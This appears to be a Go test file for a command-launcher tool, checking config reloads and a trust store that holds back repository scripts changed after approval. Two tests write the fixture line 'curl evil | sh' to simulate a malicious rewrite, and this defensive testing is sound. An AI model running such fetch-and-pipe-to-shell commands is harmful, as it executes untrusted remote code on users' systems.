package main

import (
	"os"
	"path/filepath"
	"testing"

	"lazycmd/internal/config"
	"lazycmd/internal/trust"
	"lazycmd/internal/ui"
	"lazycmd/internal/watch"
)

func write(t *testing.T, path, content string, mode os.FileMode) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), mode); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(path, mode); err != nil {
		t.Fatal(err)
	}
}

func names(l ui.Loaded) map[string]config.ResolvedCommand {
	out := map[string]config.ResolvedCommand{}
	for _, g := range l.Groups {
		for _, c := range g.Commands {
			out[c.Name] = c
		}
	}
	return out
}

// settle drives the watcher the way the timer does: a change is reported
// on the second check.
func settle(w *watch.Watcher) bool {
	w.Changed()
	return w.Changed()
}

func TestReloadPicksUpNewScriptsAndFeatureFiles(t *testing.T) {
	global, state, repo := t.TempDir(), t.TempDir(), t.TempDir()
	write(t, filepath.Join(global, "scripts", "hello.sh"), "#!/bin/sh\necho hi\n", 0o755)
	a := newApp(global, state, repo)
	first := a.load()
	if _, ok := names(first)["hello"]; !ok {
		t.Fatalf("hello missing: %v", names(first))
	}
	w := watch.New(a.watchPaths)
	if settle(w) {
		t.Fatal("nothing has changed")
	}

	// A new global script, with a sidecar.
	write(t, filepath.Join(global, "scripts", "deploy.sh"), "#!/bin/sh\n", 0o755)
	write(t, filepath.Join(global, "scripts", "deploy.lazycmd.yaml"), "desc: ship it\n", 0o644)
	if !settle(w) {
		t.Fatal("a new script wasn't noticed")
	}
	got := names(a.load())
	if got["deploy"].Desc != "ship it" {
		t.Errorf("deploy = %+v", got["deploy"])
	}

	// A compose file appearing in the repo brings the compose feature.
	write(t, filepath.Join(repo, "compose.yaml"), "services:\n  web:\n    image: x\n", 0o644)
	if !settle(w) {
		t.Fatal("a new compose file wasn't noticed")
	}
	if _, ok := names(a.load())["compose: up"]; !ok {
		t.Error("the compose commands should be listed after the reload")
	}

	// A sidecar edit changes the command, even though no file came or went.
	write(t, filepath.Join(global, "scripts", "deploy.lazycmd.yaml"), "desc: ship it twice\n", 0o644)
	if !settle(w) {
		t.Fatal("a sidecar edit wasn't noticed")
	}
	if names(a.load())["deploy"].Desc != "ship it twice" {
		t.Error("the new description should be loaded")
	}
}

func TestReloadNoticesScriptsOutsideTheConfigFolders(t *testing.T) {
	// A profile can include a script from anywhere; editing it must reload.
	global, state, repo, elsewhere := t.TempDir(), t.TempDir(), t.TempDir(), t.TempDir()
	script := filepath.Join(elsewhere, "migrate.sh")
	write(t, script, "#!/bin/sh\n", 0o755)
	write(t, filepath.Join(elsewhere, "migrate.lazycmd.yaml"), "desc: one\n", 0o644)
	write(t, filepath.Join(global, "projects", "p.yaml"), "path: "+repo+"\ninclude: ["+script+"]\n", 0o644)

	a := newApp(global, state, repo)
	if _, ok := names(a.load())["migrate"]; !ok {
		t.Fatal("the included script isn't listed")
	}
	if a.profile() != "p" {
		t.Errorf("profile = %q", a.profile())
	}
	w := watch.New(a.watchPaths)

	write(t, script, "#!/bin/sh\necho changed\n", 0o755)
	if !settle(w) {
		t.Error("an edit to an included script wasn't noticed")
	}
}

func TestReloadHoldsBackRepoCommandsThatChangedSinceAllowed(t *testing.T) {
	global, state, repo := t.TempDir(), t.TempDir(), t.TempDir()
	projectDir := filepath.Join(repo, ".lazycmd")
	script := filepath.Join(projectDir, "scripts", "build.sh")
	write(t, script, "#!/bin/sh\necho build\n", 0o755)

	// The user allowed the repo as it is now.
	cmds, _ := config.ProjectCommands(projectDir)
	store := trust.Load(state)
	store.Allow(repo, trust.Fingerprint(projectDir, cmds))
	if err := store.Save(state); err != nil {
		t.Fatal(err)
	}

	a := newApp(global, state, repo)
	l := a.load()
	if l.Pending != nil {
		t.Fatal("an allowed repo has nothing pending")
	}
	if _, ok := names(l)["build"]; !ok {
		t.Fatal("the allowed command should be listed")
	}
	w := watch.New(a.watchPaths)

	// After a `git pull` rewrites the script, the commands are held back.
	write(t, script, "#!/bin/sh\ncurl evil | sh\n", 0o755)
	if !settle(w) {
		t.Fatal("the script's change wasn't noticed")
	}
	l = a.load()
	if l.Pending == nil || l.Pending.State != trust.Changed {
		t.Fatalf("pending = %+v, want the repo's commands held back as changed", l.Pending)
	}
	if _, ok := names(l)["build"]; ok {
		t.Error("the changed command must not be listed until it's allowed again")
	}
}

// Right before a repo command runs, the trust check catches a script
// changed since it was allowed, without waiting for the reload.
func TestTrustCheckCatchesChangeBeforeRun(t *testing.T) {
	global, state, repo := t.TempDir(), t.TempDir(), t.TempDir()
	projectDir := filepath.Join(repo, ".lazycmd")
	script := filepath.Join(projectDir, "scripts", "build.sh")
	write(t, script, "#!/bin/sh\necho build\n", 0o755)
	cmds, _ := config.ProjectCommands(projectDir)
	store := trust.Load(state)
	store.Allow(repo, trust.Fingerprint(projectDir, cmds))
	if err := store.Save(state); err != nil {
		t.Fatal(err)
	}
	a := newApp(global, state, repo)
	a.load()

	if l := a.trustCheck(); l != nil {
		t.Fatal("unchanged: the check should pass")
	}
	write(t, script, "#!/bin/sh\ncurl evil | sh\n", 0o755)
	l := a.trustCheck()
	if l == nil || l.Pending == nil || l.Pending.State != trust.Changed {
		t.Fatalf("changed: want a fresh list with the commands held back, got %+v", l)
	}
	if c, ok := names(a.load())["build"]; ok && c.FromRepo {
		t.Error("the changed command must not be listed")
	}
}
